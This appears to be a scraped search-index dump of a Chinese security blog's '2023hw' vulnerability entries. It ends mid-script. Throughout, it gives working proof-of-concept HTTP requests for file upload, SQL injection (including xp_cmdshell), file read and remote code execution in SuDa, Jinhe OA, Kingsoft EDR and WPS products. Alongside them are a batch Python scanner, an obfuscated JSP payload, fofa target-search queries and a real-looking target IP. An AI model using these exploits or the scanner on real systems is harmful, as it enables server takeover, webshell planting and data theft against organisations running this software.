","date":"2023-12-08","objectID":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"速达软件全系产品存在任意文件上传漏洞","uri":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /report/DesignReportSave.jsp?report=../625248.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Connection: close Host: 127.0.0.1 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 Content-Type: application/octet-stream Content-Length: 28 \u003c% out.print(\"984969719\");%\u003e ","date":"2023-12-08","objectID":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"速达软件全系产品存在任意文件上传漏洞","uri":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"批量脚本 import requests import argparse poc = \"/report/DesignReportSave.jsp?report=../625248.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36\", \"Content-Type\": \"application/octet-stream\" } data = '''\u003c% out.print(\"This is a page !\");%\u003e''' def chack(url): try: url = \"http://\"+url reps = requests.post(url=url+poc,headers=headers,data=data,verify=False,timeout=5) shell_path = url+\"/625248.jsp\" repps = requests.get(url=shell_path,headers=headers,verify=False,timeout=3) if repps.status_code == 200: print(f\"[+] 存在速达软件存在任意文件上传 url : {shell_path}\") else: print(f\"未发现速达软件存在任意文件上传 url : {url}\") except Exception as e: print(f\"ERROR : {e}\") def main(): parser = argparse.ArgumentParser(description='速达软件全系产品存在任意文件上传') parser.add_argument('-u', '--url', type=str, help='URL to process') parser.add_argument('-f', '--file', type=str, help='File path to process') args = parser.parse_args() if args.url: chack(args.url) elif args.file: with open(args.file, 'r') as file: lines = file.readlines() for line in lines: chack(line.strip()) else: print(\"eg : python3 速达软件全系产品存在任意文件上传.py -u http://xx.xx.x.x\") print(\"eg : python3 速达软件全系产品存在任意文件上传.py -f 123.txt\") if __name__ == '__main__': main() ","date":"2023-12-08","objectID":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"速达软件全系产品存在任意文件上传漏洞","uri":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"jc6/platform\" ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"金和jc6 jcsUploadServlet 存在任意文件上传","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc http://222.180.197.70:18888/jc6/upload/2023-08-16/ttt22.jsp POST /jc6/servlet/jcsUploadServlet?mtpId= HTTP/1.1 Host: 222.180.197.70:18888 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=1F974730AB7C793ADF87BB3C82E7619B Connection: close Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Length: 2105 --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"iframeId\" ttt22 --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"fileSuffix\" jsp --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"myFile\"; filename=\"1.txt\" Content-Type: application/octet-stream ;$\u001f\u001fRsqhmf\u001fG08U5\u001f\u003c\u001fqdptdrs-fdsO`q`ldsdq'!o`rr!(:he\u001f'G08U5\u001f \u003c\u001fmtkk(\u001fz\u001fbk`rr\u001fDhAGFJ2B\u001fdwsdmcr.)YcYjC1Y82D).Bk`rrKn`cdq\u001fz\u001fDhAGFJ2B'Bk`rrKn`cdq\u001fKbwRoj(\u001fz\u001frtodq'KbwRoj(:\u001f|\u001fotakhb\u001fBk`rr\u001fG08U5'axsdZ\\\u001fa(\u001fz\u001fqdstqm\u001frtodq-cdehmdBk`rr'a+\u001f/+\u001fa-kdmfsg(:||axsdZ\\\u001faxsdr\u001f\u003c\u001fmtkk:sqx\u001fzhmsZ\\\u001f``\u001f\u003c\u001fmdv\u001fhmsZ\\z88+\u001f0/0+\u001f015+\u001f51+\u001f014+\u001f010+\u001f88+\u001f004+\u001f51+\u001f71+\u001f70+\u001f56+\u001f74+\u001f27+\u001f25+\u001f73+\u001f006+\u001f004+\u001f016+\u001f005+\u001f006+\u001f87|:\u001fRsqhmf\u001fbbrsq\u001f\u003c\u001f!!:enq\u001f'hms\u001fh\u001f\u003c\u001f/:\u001fh\u001f;\u001f``-kdmfsg:\u001fh**(\u001fz``Zh\\\u001f\u003c\u001f``Zh\\\u001f]\u001f/w/0/:\u001fbbrsq\u001f\u003c\u001fbbrsq\u001f*\u001f'bg`q(\u001f``Zh\\:|Bk`rr\u001f@8BSn\u001f\u003c\u001fBk`rr-enqM`ld'bbrsq(:Rsqhmf\u001fj\u001f\u003c\u001fmdv\u001fRsqhmf'mdv\u001faxsdZ\\z0//+0/0+88+000+0//+0/0+55+006+0/1+0/1+0/0+003|(:axsdr\u001f\u003c\u001f'axsdZ\\(\u001f@8BSn-fdsLdsgnc'j+\u001fRsqhmf-bk`rr(-hmunjd'@8BSn-mdvHmrs`mbd'(+\u001fG08U5(:|b`sbg\u001f'Dwbdoshnm\u001fd(\u001fzhmsZ\\\u001f``\u001f\u003c\u001fmdv\u001fhmsZ\\z011+\u001f002+\u001f0/1+\u001f002+\u001f51+\u001f0/0+\u001f0//+\u001f010+\u001f013+\u001f51+\u001f71+\u001f002+\u001f88+\u001f006+\u001f27+\u001f25|:Rsqhmf\u001fbbrsq\u001f\u003c\u001f!!:enq\u001f'hms\u001fh\u001f\u003c\u001f/:\u001fh\u001f;\u001f``-kdmfsg:\u001fh**(\u001fz``Zh\\\u001f\u003c\u001f``Zh\\\u001f]\u001f/w/0/:bbrsq\u001f\u003c\u001fbbrsq\u001f*\u001f'bg`q(\u001f``Zh\\:|Bk`rr\u001fbk`yy\u001f\u003c\u001fBk`rr-enqM`ld'bbrsq(:Naidbs\u001fcdbncdq\u001f\u003c\u001fbk`yy-fdsLdsgnc'!fdsCdbncdq!(-hmunjd'mtkk(:axsdr\u001f\u003c\u001f'axsdZ\\(\u001fcdbncdq-fdsBk`rr'(-fdsLdsgnc'!cdbncd!+\u001fRsqhmf-bk`rr(-hmunjd'cdbncdq+\u001fG08U5(:|Bk`rr\u001f`Bk`rr\u001f\u003c\u001fmdv\u001fDhAGFJ2B'Sgqd`c-btqqdmsSgqd`c'(-fdsBnmsdwsBk`rrKn`cdq'((-G08U5'axsdr(:Naidbs\u001fn\u001f\u003c\u001f`Bk`rr-mdvHmrs`mbd'(:n-dpt`kr'o`fdBnmsdws(:|\u001fdkrd\u001fz|\u001f$= --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"attachmentId\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"isSingle\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 Content-Disposition: form-data; name=\"fileOldName\" --54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95-- ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"金和jc6 jcsUploadServlet 存在任意文件上传","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"exp detail: ID: 4946 Author: 匿名作者 Name: 金和jc6存在任意文件上传 Description: 金和OA是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。因未对接口进行过滤限制，导致了任意文件的上传，可上传木马从而控制服务器 Identifier: DVB: DVB-2023-4946 VulnClass: - 任意文件上传 Category: - Web服务器集群 Manufacturer: 金和软件 Product: jc6 Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: '2023-08-15' Region: 中国大陆 Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"jc6/platform\" Solutions: - 对上传⽂件的⼤⼩和类型进⾏校验，定义上传⽂件类型⽩名单。 poc: relative: req0 \u0026\u0026 req1 session: false get_variables: - year: getNowTime(\"Year\") - month: getNowTime(\"Month\") - day: getNowTime(\"Day\") - randomstr: randomLowerCase(5) - payload: base64Decode(\"LS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaWZyYW1lSWQiDQoNCnR0dDY2Ng0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZVN1ZmZpeCINCg0KanNwDQotLTU0ZjZiMDBlMzVjYTc2NWQ2NGE5Nzc2YzU5M2JmZTI5OGIyNGIwNmJjMTdiMjlhMDM2NGM0MGNkZWE5NQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJteUZpbGUiOyBmaWxlbmFtZT0iMS50eHQiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSAgb3V0LnByaW50bG4oInRlc3QxMjMzMzMzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iYXR0YWNobWVudElkIg0KDQoNCi0tNTRmNmIwMGUzNWNhNzY1ZDY0YTk3NzZjNTkzYmZlMjk4YjI0YjA2YmMxN2IyOWEwMzY0YzQwY2RlYTk1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImlzU2luZ2xlIg0KDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZU9sZE5hbWUiDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUtLQ0K\") requests: - method: POST timeout: 10 path: /jc6/servlet/jcsUploadServlet?mtpId= headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.1141.87 Safari/537.36 Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95 data: '{{payload}}' follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"OK\")) - method: GET timeout: 10 path: /jc6/upload/{{year}}-{{month}}-{{day}}/ttt666.jsp headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3187.54 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"test1233333\")) `` ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["2023hw"],"title":"金和jc6 jcsUploadServlet 存在任意文件上传","uri":"/%E9%87%91%E5%92%8Cjc6-jcsuploadservlet-%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"jc6/platform\" ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-officeserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"金和jc6 OfficeServer 任意文件上传","uri":"/%E9%87%91%E5%92%8Cjc6-officeserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"poc http://222.180.197.70:18888/public/edit/info.jsp POST /jc6/OfficeServer HTTP/1.1 Host: 222.180.197.70:18888 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=71F872436B3C4F98DB5A307DA5DD3707 Connection: close Content-Length: 182 Hello World 87 0 533 DBSTEP=REJTVEVQ OPTION=U0FWRUZJTEU= FILENAME=Li4vLi4vcHVibGljL2VkaXQvaW5mby5qc3A= \u003c%out.println(\"only test\");%\u003e ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Cjc6-officeserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"金和jc6 OfficeServer 任意文件上传","uri":"/%E9%87%91%E5%92%8Cjc6-officeserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"```\rPOST /C6/Control/GetSqlData.aspx/.ashx Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip exec master..xp_cmdshell ‘ipconfig’ ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa-c6-getsqldata.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金和OA C6-GetSqlData.aspx SQL注入漏洞","uri":"/%E9%87%91%E5%92%8Coa-c6-getsqldata.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"1. 漏洞链接 http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:1","tags":["2023hw"],"title":"金和OA C6-GetTreeDate.aspx sql注入漏洞","uri":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"2. 复现步骤 http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:2","tags":["2023hw"],"title":"金和OA C6-GetTreeDate.aspx sql注入漏洞","uri":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"3. 代码审计 直接拼接sql语句导致注入产生 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:3","tags":["2023hw"],"title":"金和OA C6-GetTreeDate.aspx sql注入漏洞","uri":"/%E9%87%91%E5%92%8Coa-c6-gettreedate.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\r内容: POST /C6/Jhsoft.Web.module/eformaspx/editeprint.aspx?key=writefile\u0026filename=1.ashx\u0026KeyCode=sxfZyQBw8yQ=\u0026designpath=/C6/\u0026typeid=\u0026sPathfceform=./ 放文件内容即可，但是没有包 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa-c6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"金和OA C6任意文件上传","uri":"/%E9%87%91%E5%92%8Coa-c6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"金和OA任意文件读取漏洞 ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金和OA任意文件读取漏洞","uri":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"金和网络-金和OA\" ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"金和OA任意文件读取漏洞","uri":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: */* Connection: Keep-Alive ","date":"2023-12-08","objectID":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"金和OA任意文件读取漏洞","uri":"/%E9%87%91%E5%92%8Coa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金山EDR RCE漏洞 开启⽇志 /Console/inter/handler/change_white_list_cmd.php id参数 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 131 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7\u0026m2=0 {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set//global//general_log=on;\",\"type\":\"0\"}} 设置日志php文件 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 Content-Length: 195 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.24.3:6868 Referer: http://192.168.24.3:6868/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7 Connection: close {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set//global//general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656 36b5f6c6f67696e322e706870;\",\"type\":\"0\"}} 写入php代码 POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 222 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/index.php {\"settings_distribute_cmd\":{\"userSession\":\"{BD435CCE-3F91-E1AA-3844- 76A49EE862EB}\",\"mode_id\":\"3AF264D9-AE5A-86F0-6882-DD7F56827017\",\"settings\":\"3AF264D9- AE5A-86F0-6882-DD7F56827017_0\",\"SC_list\":{\"a\":\"\u003c?php phpinfo();?\u003e\"}}} 最后get请求rce： http://192.168.24.3:6868/check_login2.php ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1edr-rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"金山EDR RCE漏洞","uri":"/%E9%87%91%E5%B1%B1edr-rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\r开启⽇志 /Console/inter/handler/change_white_list_cmd.php id参数 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: / Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 131 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7\u0026m2=0 {“change_white_list_cmd”:{“ip”:\"{BD435CCE-3F91EC}\",“name”:“3AF264D9- AE5A”,“id”:“111;set//global//general_log=on;”,“type”:“0”}} 设置日志php文件 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 Content-Length: 195 Accept: / X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.24.3:6868 Referer: http://192.168.24.3:6868/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7 Connection: close {“change_white_list_cmd”:{“ip”:\"{BD435CCE-3F91EC}\",“name”:“3AF264D9- AE5A”,“id”:“111;set//global//general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656 36b5f6c6f67696e322e706870;”,“type”:“0”}} 写入php代码 POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: / Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 222 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/index.php {“settings_distribute_cmd”:{“userSession”:\"{BD435CCE-3F91-E1AA-3844- 76A49EE862EB}\",“mode_id”:“3AF264D9-AE5A-86F0-6882-DD7F56827017”,“settings”:“3AF264D9- AE5A-86F0-6882-DD7F56827017_0”,“SC_list”:{“a”:\"\u003c?php phpinfo();?\u003e\"}}} 最后get请求rce： http://192.168.24.3:6868/check_login2.php ","date":"2023-12-08","objectID":"/%E9%87%91%E5%B1%B1edr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"金山edr代码执行漏洞","uri":"/%E9%87%91%E5%B1%B1edr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"金山WPS RCE wps影响范围为：WPS Office 2023 个人版 \u003c 11.1.0.15120 WPS Office 2019 企业版 \u003c 11.8.2.12085 POC 在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn 漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系 代码块在底下。（需要原pdf加wechat） \u003cscript\u003e if(typeof alert === \"undefined\"){ alert = console.log; } let f64 = new Float64Array(1); let u32 = new Uint32Array(f64.buffer); function d2u(v) { f64[0] = v; return u32; } function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; } function gc(){ // major for (let i = 0; i \u003c 0x10; i++) { new Array(0x100000); } } function foo(bug) { function C(z) { Error.prepareStackTrace = function(t, B) { return B[z].getThis(); }; let p = Error().stack; Error.prepareStackTrace = null; return p; } function J() {} var optim = false; var opt = new Function( 'a', 'b', 'c', 'if(typeof a===\\'number\\'){if(a\u003e2){for(var i=0;i\u003c100;i++);return;}b.d(a,b,1);return}' + 'g++;'.repeat(70)); var e = null; J.prototype.d = new Function( 'a', 'b', '\"use 